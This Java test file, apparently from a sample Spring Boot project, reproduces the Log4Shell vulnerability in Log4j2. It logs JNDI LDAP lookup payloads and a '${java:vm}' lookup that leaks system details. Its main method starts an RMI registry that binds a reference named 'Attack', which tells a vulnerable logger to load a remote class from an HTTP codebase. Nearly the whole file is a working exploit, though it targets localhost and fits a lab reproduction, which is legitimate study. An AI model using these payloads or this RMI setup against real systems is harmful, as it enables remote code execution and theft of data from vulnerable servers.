package com.cristik.sample.log4j2.test;

import com.cristik.sample.log4j2.Log4j2Application;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import lombok.extern.slf4j.Slf4j;
import org.junit.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit.jupiter.SpringExtension;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

@Slf4j
@ExtendWith(SpringExtension.class)
@SpringBootTest(classes = Log4j2Application.class, webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
public class Log4j2AttackerTest {

    @Test
    public void attackTest() {
        log.error("${jndi:ldap://127.0.0.1:8080/test/test/log}");
//        log.error("${}","jndi:ldap://127.0.0.1:1389/#Exploit");
    }

    @Test
    public void log4jAttackTest() {
        String user = "${java:vm}";
        log.info("{}",user);
    }

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Attack","Attack","http://127.0.0.1:80/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("obj", wrapper);
    }

}
